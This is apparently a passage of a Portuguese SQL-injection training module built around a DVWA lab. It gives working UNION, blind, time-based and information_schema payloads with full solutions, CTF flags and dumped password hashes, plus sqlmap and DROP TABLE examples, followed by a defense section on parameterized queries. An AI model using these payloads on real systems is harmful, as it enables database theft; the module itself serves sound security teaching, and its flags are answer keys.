+devolve antes de usar `UNION`. Use o `ORDER BY`, subindo o número até o banco
+reclamar. Digite no campo (a aspa inicial fecha o literal que o código abriu):
+
+```text
+1' ORDER BY 2-- -
+```
+
+Volta a linha do `admin`, sem erro. Agora tente `ORDER BY 3`:
+
+```text
+1' ORDER BY 3-- -
+```
+
+```text
+Fatal error: ... Unknown column '3' in 'order clause' ...
+```
+
+Parou no 3: logo, a consulta tem **2 colunas**. (Faz sentido: a página mostra
+`First name` e `Surname`.)
+
+**Passo 3 — Veja o UNION funcionar.** Com 2 colunas, um `UNION SELECT` com dois
+valores literais já aparece na tela. Teste:
+
+```text
+1' UNION SELECT 'coluna-um', 'coluna-dois'-- -
+```
+
+A página passa a mostrar duas "linhas": a do `admin` e a sua, com `First name:
+coluna-um` e `Surname: coluna-dois`. Você confirmou **onde** o dado aparece: a
+primeira coluna cai em `First name`, a segunda em `Surname`.
+
+**Passo 4 — O desafio.** Agora é com você. O objetivo é **despejar a tabela
+`users`** — cada login com o seu hash de senha — e ler a conta cujo `user_id`
+é 3. A flag é `FLAG{usuario-hash8}`: o **nome** dessa conta e os **8 primeiros
+caracteres hexadecimais** do hash de senha dela (por exemplo,
+`FLAG{fulano-1a2b3c4d}`).
+
+Você já sabe que são 2 colunas e onde elas aparecem. Falta escolher **o que**
+colocar no `UNION SELECT` e de **qual tabela**. Pense em quais colunas da tabela
+`users` guardam o login e a senha.
+
+<Hint title="Dica 1 — o que extrair">
+A tabela se chama `users`. As colunas que interessam são `user` (o login) e
+`password` (o hash). Monte um `UNION SELECT <coluna1>, <coluna2> FROM users`. Para
+ver todas as contas de uma vez, não restrinja por `user_id`.
+</Hint>
+
+<Hint title="Dica 2 — ler o user_id de cada linha">
+As contas aparecem na ordem do `user_id` (1, 2, 3, 4, 5). A terceira linha da sua
+listagem é o `user_id` 3. Se quiser ter certeza, troque a primeira coluna por
+`user_id` e a segunda por `CONCAT(user, 0x3a, password)` para ver id, login e
+hash juntos.
+</Hint>
+
+<Solution title="Solução">
+No campo **User ID**, envie:
+
+```text
+1' UNION SELECT user, password FROM users-- -
+```
+
+A página lista as cinco contas. A saída real (os hashes são os do DVWA; o seu
+ambiente mostra os mesmos):
+
+```text
+ID: 1' UNION SELECT user, password FROM users-- -
+First name: admin
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+First name: gordonb
+Surname: e99a18c428cb38d5f260853678922e03
+First name: 1337
+Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
+First name: pablo
+Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
+First name: smithy
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+```
+
+A terceira linha (a de `user_id` 3) é a conta **`1337`**, com o hash
+`8d3533d75ae2c3966d7e0d4fcc69216b`. Os 8 primeiros caracteres são `8d3533d7`.
+A flag é `FLAG{1337-8d3533d7}`.
+
+Querendo confirmar o `user_id`, envie
+`1' UNION SELECT user_id, CONCAT(user,0x3a,password) FROM users-- -`: a linha com
+`ID 3` é o `1337`.
+</Solution>
+
+<FlagInput task="missao-1-union" />
+
+<Callout variant="tip" title="Esses hashes dizem algo">
+Os valores do `Surname` são hashes <GlossaryTerm term="MD5">MD5</GlossaryTerm> —
+128 bits, 32 caracteres hexadecimais, sem salt. MD5 sem salt é péssimo para
+senhas: repare que o `admin` e o `smithy` têm o **mesmo** hash
+(`5f4dcc3b...`), o que denuncia **a mesma senha**. Jogados numa wordlist, esses
+hashes caem em segundos (a base de 2.8 e da Trilha 3). Guarde o elo: a SQLi
+**extrai** o hash; a fraqueza do hash **entrega** a senha.
+</Callout>
+
+### 5.3 Missão 2 — Leia o que não aparece (blind)
+
+Agora o modo difícil. No menu, abra **SQL Injection (Blind)**. É parecido, mas
+com uma diferença crucial: a página **não** mostra os dados. Ela só diz se o
+`User ID` existe ou não — e nem mostra os erros do banco. O `UNION` da Missão 1
+não ajuda aqui: não há onde o dado apareça.
+
+**Passo 1 — Conheça os dois estados.** Envie `1`. A página responde:
+
+```text
+User ID exists in the database.
+```
+
+Envie `999` (um id que não existe):
+
+```text
+User ID is MISSING from the database.
+```
+
+Essas duas frases são **tudo** o que você tem. Cada requisição lhe dá **um bit**:
+"existe" (vamos chamar de verdadeiro) ou "missing" (falso).
+
+**Passo 2 — Injete uma condição.** O truque do blind é anexar uma condição sua ao
+`WHERE` e ver qual das duas frases volta. Envie:
+
+```text
+1' AND 1=1-- -
+```
+
+Volta "exists" (a linha 1 existe **e** `1=1` é verdade). Agora:
+
+```text
+1' AND 1=2-- -
+```
+
+Volta "missing" (a linha existe, mas `1=2` é falso, então a condição total é
+falsa). Confirmado: a frase da página espelha o valor da sua condição. Você tem
+um oráculo de verdadeiro/falso.
+
+**Passo 3 — O desafio.** O objetivo é descobrir o **hash de senha do `admin`**
+sem nunca vê-lo na tela — só perguntando "sim/não". A flag é
+`FLAG{tamanho-4hex}`: quantos caracteres o hash tem e os **4 primeiros**
+caracteres hexadecimais dele (por exemplo, `FLAG{32-abcd}`).
+
+Você vai precisar de duas peças de SQL: uma que meça o **tamanho** de um texto e
+outra que pegue **um caractere numa posição**. E vai precisar fazer a condição
+falar do `admin` especificamente.
+
+<Hint title="Dica 1 — tamanho">
+`LENGTH(texto)` devolve o tamanho. Para testar se o hash do admin tem N
+caracteres, pergunte se `(SELECT LENGTH(password) FROM users WHERE user='admin')`
+é igual a N. Comece testando `= 32` (o tamanho de um hash MD5). Se o filtro
+implicar em problema com a aspa de `'admin'`, escreva o nome em hexadecimal:
+`0x61646d696e`.
+</Hint>
+
+<Hint title="Dica 2 — um caractere por vez">
+`SUBSTRING(texto, posição, 1)` pega um caractere. Para saber o primeiro caractere
+do hash, compare `SUBSTRING(password,1,1)` com cada candidato (`'5'`, `'f'`...).
+Como hash é hexadecimal, os candidatos são só `0-9` e `a-f`. Depois mude a posição
+para 2, 3, 4. Para evitar aspas, use o hex do caractere: `'5'` é `0x35`, `'f'` é
+`0x66`.
+</Hint>
+
+<Solution title="Solução">
+Primeiro, o tamanho. Envie:
+
+```text
+1' AND (SELECT LENGTH(password) FROM users WHERE user=0x61646d696e)=32-- -
+```
+
+A página responde **"User ID exists"** — verdadeiro. O hash tem **32**
+caracteres (é MD5, como a Missão 1 sugeria).
+
+Agora, caractere a caractere. O primeiro:
+
+```text
+1' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE user=0x61646d696e)=0x35-- -
+```
+
+`0x35` é `'5'`. Volta "exists": o primeiro caractere é `5`. Repita para a posição
+2 testando `0x66` (`'f'`), e assim por diante. Para acelerar, dá para confirmar
+vários de uma vez comparando o prefixo:
+
+```text
+1' AND (SELECT SUBSTRING(password,1,4) FROM users WHERE user=0x61646d696e)=0x35663464-- -
+```
+
+`0x35663464` é a string `5f4d`. Volta "exists": os quatro primeiros caracteres do
+hash do admin são **`5f4d`**.
+
+A flag é `FLAG{32-5f4d}`. (E confere com a Missão 1: o hash do `admin` começava
+mesmo com `5f4dcc3b...`.)
+
+**Por que isto é *blind*:** você leu um dado que a página nunca exibiu, perguntando
+só "sim" ou "não". Quando nem o "exists/missing" mudasse, a saída seria o
+*time-based*: trocar a comparação por `IF(condição, SLEEP(2), 0)` e cronometrar a
+resposta. No DVWA, uma condição verdadeira leva a resposta a demorar ~2 segundos;
+uma falsa volta na hora.
+</Solution>
+
+<FlagInput task="missao-2-blind" />
+
+### 5.4 Desligar o laboratório
+
+Terminou? No painel **Laboratório**, clique em **Parar** (libera a vaga do "um lab
+por vez"). Se quiser refazer as missões do zero, use **Resetar**, que recria o
+alvo. Pelo terminal, é `scripts/lab.sh down dvwa`.
+
+## 6. Variações e aprofundamento
+
+A Missão 1 foi no nível `low`. O mundo real raramente é tão gentil. Veja o que
+muda, usando os outros níveis do próprio DVWA como mapa.
+
+**Nível `medium` — sem aspas, mas ainda vulnerável.** O código `medium` faz duas
+coisas: envia o `id` por `POST` (um menu suspenso, não um campo de texto) e aplica
+`mysqli_real_escape_string($id)`, que **escapa as aspas**. Parece seguro, mas o
+`id` é usado **sem aspas** na query: `WHERE user_id = $id`. Como o valor não está
+entre aspas, você **não precisa** de aspas para injetar — e o escape, que só mexe
+em aspas, não serve de nada:
+
+```sql
+-- id enviado (via Burp Repeater, já que é POST e select):
+1 UNION SELECT user, password FROM users-- -
+```
+
+A lição é importante: **escapar aspas não é parametrizar**. Se o dado entra em
+contexto numérico (sem aspas), o escape de aspas é irrelevante. Aqui entra o 2.5:
+como o campo é um `<select>`, você intercepta o `POST` no Burp e edita o `id` no
+Repeater — a interface não deixa, mas o servidor aceita.
+
+**Nível `high` — a injeção que vem de outra página.** O `high` guarda o `id` na
+sessão (vindo de uma janela separada) e consulta com `LIMIT 1`. A concatenação
+continua lá (`WHERE user_id = '$id'`), então ainda é injetável; o `LIMIT 1` só
+limita a uma linha, o que se contorna com um comentário antes dele. É um exemplo
+de SQLi em que o ponto de entrada e o ponto de execução estão **separados** — um
+primo da <GlossaryTerm term="second-order SQL injection">second-order SQL
+injection</GlossaryTerm>, em que a entrada maliciosa é **armazenada** primeiro
+(num cadastro, por exemplo) e só dispara a falha depois, quando outra parte da
+aplicação a usa numa query.
+
+**Outras variações que valem conhecer:**
+
+- **SQLi em `INSERT`, `UPDATE` e `ORDER BY`.** Nem toda injeção é num `SELECT`
+  com `WHERE`. Um `ORDER BY` injetável não aceita `UNION` direto (a sintaxe não
+  deixa), o que força técnicas booleanas. Em `INSERT`/`UPDATE`, a injeção pode
+  alterar outros campos.
+- <GlossaryTerm term="stacked queries">**Stacked queries**</GlossaryTerm>:
+  empilhar um comando novo com `;` — `'; DROP TABLE users-- `. Só funciona se a
+  API do banco permitir múltiplos comandos numa chamada (o `mysqli_query` do PHP,
+  por exemplo, **não** permite por padrão; já o SQL Server com certas APIs,
+  sim).
+- **Bancos diferentes, dialetos diferentes.** `SLEEP()` é do MySQL/MariaDB; no
+  PostgreSQL é `pg_sleep()`, no SQL Server é `WAITFOR DELAY`. A concatenação de
+  strings, os comentários e as funções de metadados mudam de nome. Identificar o
+  DBMS (pelos erros, pelo comportamento) é parte do trabalho.
+- **A automação: o `sqlmap`.** O que você fez à mão nas missões é o que o
+  <GlossaryTerm term="sqlmap">sqlmap</GlossaryTerm> faz sozinho: detecta a
+  injeção, identifica a técnica e o banco, e extrai os dados. Um `sqlmap -u
+  '.../sqli/?id=1&Submit=Submit' --cookie='...' --batch --dump` despeja a tabela.
+  Ele é poderoso **porque** você entende o que ele automatiza — e é exatamente por
+  isso que ferramenta nenhuma substitui a seção 3. Foi o `sqlmap`, aliás, que o
+  atacante da TalkTalk usou (seção 4). Use só com autorização.
+
+## 7. Erros comuns
+
+- **"Mandei `'` e não deu erro nenhum."** Pode não ser injetável — ou o erro está
+  escondido (o nível `medium`/`high`, ou produção, costuma suprimir erros). Não
+  conclua que é seguro: parta para o teste **lógico** (`AND 1=1` vs `AND 1=2`) e,
+  se nem isso mudar a página, para o **blind por tempo** (`SLEEP`).
+- **"Meu `UNION` dá erro de número de colunas."** Você errou a contagem. Volte ao
+  `ORDER BY N` (ou `UNION SELECT NULL,NULL,...`) e ache o número exato. Um a mais
+  ou a menos quebra tudo.
+- **"O `UNION` reclama de tipo."** Alguma coluna exige um tipo específico. Use
+  `NULL` nas colunas que não for usar (NULL encaixa em qualquer tipo) e ponha o
+  dado só na coluna que a página imprime.
+- **"Esqueci o espaço no comentário."** No MySQL/MariaDB, `--` precisa de um
+  espaço depois. Escreva `-- -` para garantir. Sem o espaço, o resto da query não
+  é comentado e você toma erro de sintaxe.
+- **"No `medium` a interface não deixa eu digitar o payload."** É um `<select>`:
+  a validação está só no cliente (4.1). Intercepte o `POST` no Burp e edite o `id`
+  no Repeater. O servidor aceita o que a página proibia.
+- **"A aspa do meu `'admin'` está atrapalhando."** Escreva a string em
+  hexadecimal: `admin` vira `0x61646d696e`. Sem aspas no *payload*, sem conflito.
+- **"Submeti a flag e deu errado."** Confira o formato exato: `FLAG{usuario-hash8}`
+  tem o login e **8** caracteres do hash, separados por hífen; `FLAG{tamanho-4hex}`
+  tem o número **32** e os **4** primeiros caracteres. Sem espaços, tudo minúsculo
+  no hex.
+
+## 8. Defesa e mitigação
+
+Agora a metade que fecha o ciclo. Quem entende por que o apóstrofo quebra a query
+entende por que a defesa certa é tão simples — e por que as "defesas" populares
+falham.
+
+### 8.1 A cura: prepared statements (parameterized queries)
+
+A causa-raiz é misturar comando e dado numa string. A cura é **nunca misturá-los**.
+Um <GlossaryTerm term="prepared statement">prepared statement</GlossaryTerm> (ou
+<GlossaryTerm term="parameterized query">parameterized query</GlossaryTerm>) manda
+ao banco o comando com **marcadores** no lugar dos valores; o banco compila esse
+comando **primeiro**, e só depois recebe os valores por um canal separado, onde
+eles são tratados sempre como dado puro — nunca reinterpretados como SQL. A aspa
+deixa de ter poder: ela é só mais um caractere do dado.
+
+Compare o código **vulnerável** (o `low` do DVWA) com o **seguro** (o
+`impossible` do próprio DVWA). Primeiro o vulnerável:
+
+```php
+// VULNERÁVEL (dvwa/sqli/source/low.php): a entrada entra na string do comando.
+$id = $_REQUEST['id'];
+$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
+$result = mysqli_query($GLOBALS["___mysqli_ston"], $query);
+```
+
+Agora o seguro, com PDO (a camada de acesso a banco do PHP):
+
+```php
+// SEGURO (dvwa/sqli/source/impossible.php): marcador :id, valor ligado à parte.
+if (is_numeric($id)) {                 // valida: aqui o id só pode ser número
+  $id = intval($id);
+  $data = $db->prepare(
+    'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'
+  );
+  $data->bindParam(':id', $id, PDO::PARAM_INT);   // o valor vai pelo canal de dados
+  $data->execute();
+}
+```
+
+O `:id` é o marcador; o `bindParam` entrega o valor pelo canal separado. Mesmo que
+alguém mande `' OR '1'='1`, o banco procura por um `user_id` **literalmente igual
+à string** `' OR '1'='1` — não acha nada, e nada é reinterpretado. A mesma ideia
+existe em toda linguagem:
+
+```python
+# Python (DB-API): nunca use f-string para montar SQL. Use placeholders.
+cur.execute("SELECT first_name FROM users WHERE user_id = %s", (user_id,))
+```
+
+```java
+// Java (JDBC): PreparedStatement com ? e setInt/setString.
+PreparedStatement ps = conn.prepareStatement(
+    "SELECT first_name FROM users WHERE user_id = ?");
+ps.setInt(1, userId);
+```
+
+**Regra única e suficiente:** todo valor que vem de fora entra na query **como
+parâmetro**, nunca por concatenação. Isso sozinho elimina a SQLi.
+
+### 8.2 O que NÃO resolve (e por quê)
+
+- **Escapar aspas à mão.** Trocar `'` por `''` ou por `\'` cobre o caso das
+  aspas, mas, como o nível `medium` do DVWA mostra, se o valor entra em contexto
+  numérico (sem aspas) o escape é inútil. E há desvios de *charset* (o clássico
+  GBK) que driblam o escape. Parametrizar cobre tudo isso de uma vez.
+- **Blocklist de palavras.** Bloquear `UNION`, `SELECT`, `OR` quebra entradas
+  legítimas e é contornável com variações de maiúsculas (`UnIoN`), comentários no
+  meio (`UN/**/ION`), encoding, ou sinônimos. Blocklist é um jogo que o defensor
+  perde.
+- **Esconder as mensagens de erro.** Ajuda (tira pistas do atacante), mas é só
+  isso: a SQLi **blind** da Missão 2 não precisa de nenhum erro. Não é defesa, é
+  redução de ruído.
+- **Confiar no cliente.** Validar no JavaScript ou usar um `<select>` (como o
+  `medium`) não protege nada: o atacante usa o Burp (4.1 e 2.5). Toda validação de
+  segurança é no servidor.
+
+### 8.3 Defesas em profundidade (somam, não substituem)
+
+A parametrização é a cura; estas camadas limitam o estrago quando algo escapa:
+
+- **Menor privilégio no banco.** A aplicação se conecta com um usuário que só tem
+  o que precisa (`SELECT`/`INSERT` nas tabelas do app), **nunca** como
+  administrador. Assim, uma injeção não lê o `information_schema` de outros bancos,
+  não cria usuários, não lê arquivos do sistema. No DVWA, o `current_user()` é
+  `dvwa@%`, um usuário dedicado — mas com mais poder do que o ideal.
+- **Validação de entrada no servidor** (*allowlist*): se o `id` só pode ser um
+  número inteiro, rejeite tudo que não for (o `is_numeric` do `impossible`).
+  Reduz a superfície, mas **não** substitui a parametrização.
+- <GlossaryTerm term="ORM">**ORM**</GlossaryTerm> **com cuidado.** Bibliotecas de
+  *Object-Relational Mapping* (Prisma, Hibernate, Django ORM) geram queries
+  parametrizadas por baixo — ótimo. Mas quase todas têm uma escotilha para "SQL
+  cru"; interpolar entrada ali reabre a falha. ORM ajuda, não imuniza.
+- <GlossaryTerm term="WAF">**WAF**</GlossaryTerm> **como rede, não como cura.** Um
+  *Web Application Firewall* bloqueia padrões de ataque conhecidos e ganha tempo
+  contra varreduras automáticas, mas é contornável (as mesmas variações da
+  blocklist) e nunca deve ser a única linha. Serve de alarme e de freio, não de
+  conserto.
+- **Detecção.** Logs de erro de SQL repetidos, picos de requisições a um mesmo
+  parâmetro com aspas e palavras-chave de SQL, ou respostas com atrasos regulares
+  (sinal de *time-based*) são indícios. Monitorar a aplicação e o banco fecha o
+  ciclo defensivo.
+
+## 9. Exercícios
+
+As duas flags do módulo saem do laboratório (seção 5): a **Missão 1** (in-band,
+`UNION`) e a **Missão 2** (blind). Se ainda não as pegou, volte lá — elas contam
+para concluir o módulo. Abaixo, o quiz de teoria e dois exercícios de fixação.
+
+<Quiz task="quiz-final" />
+
+**Exercício A (prático, no lab).** No nível `low`, descubra, usando só o
+`information_schema`, **quantas tabelas** existem no banco `dvwa` e os nomes delas.
+Você não deveria precisar saber de antemão que a tabela `users` existe.
+
+<Solution title="Solução do Exercício A">
+Envie no campo User ID:
+
+```text
+1' UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema=database()-- -
+```
+
+A saída real lista quatro tabelas no banco `dvwa`: `users`, `security_log`,
+`access_log` e `guestbook`. O `database()` devolve o banco atual (`dvwa`), então
+você nem precisa saber o nome dele.
+</Solution>
+
+**Exercício B (teoria).** Um colega "resolveu" a SQLi do sistema dele trocando,
+na entrada, toda aspa simples por duas aspas, e garante que agora está seguro.
+Dê **um** cenário em que o sistema dele continua vulnerável.
+
+<Solution title="Solução do Exercício B">
+Se algum parâmetro entra na query **sem aspas** (contexto numérico), como o
+`WHERE user_id = $id` do nível `medium`, o escape de aspas não protege: o
+atacante injeta `1 UNION SELECT ...` sem usar nenhuma aspa. Há ainda o desvio de
+*charset* (GBK e afins) que engana o escape. A correção certa não é escapar: é
+**parametrizar** (seção 8.1).
+</Solution>
+
+## 10. Resumo e glossário
+
+**Pontos-chave:**
+
+- A SQL injection nasce quando a aplicação **monta a query concatenando** a
+  entrada do usuário; o banco recebe uma string só e não distingue dado de
+  comando. A aspa simples é a fronteira que o ataque apaga.
+- `' OR '1'='1' -- ` torna a condição sempre verdadeira e comenta o resto: é a
+  forma clássica de derrubar um login.
+- Escolha a técnica pelo que a resposta mostra: **in-band** (`UNION`/erro) quando
+  o dado volta na tela; **blind** (boolean ou por tempo) quando nada aparece.
+- Explorar `UNION` é um ritual: detectar com `'`, contar colunas com `ORDER BY`,
+  achar onde o dado aparece e extrair, mapeando o banco pelo `information_schema`.
+- A defesa que cura é **prepared statements / parameterized queries**. Escapar
+  aspas, blocklists e esconder erros **não** resolvem. Menor privilégio, validação
+  no servidor, ORM e WAF **somam** como defesa em profundidade.
+
+### Termos deste módulo
+
+<ModuleGlossary />
+
+### Para ir além
+
+- [OWASP — SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) — a referência de defesa, em código, por linguagem.
+- [OWASP Top 10 2021 — A03: Injection](https://owasp.org/Top10/A03_2021-Injection/) — a categoria, os números e as recomendações oficiais.
+- [PortSwigger Web Security Academy — SQL injection](https://portswigger.net/web-security/sql-injection) — laboratórios gratuitos (in-band, blind e por tempo), dos criadores do Burp.
+- [MITRE — CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html) — a definição formal da fraqueza e suas consequências.
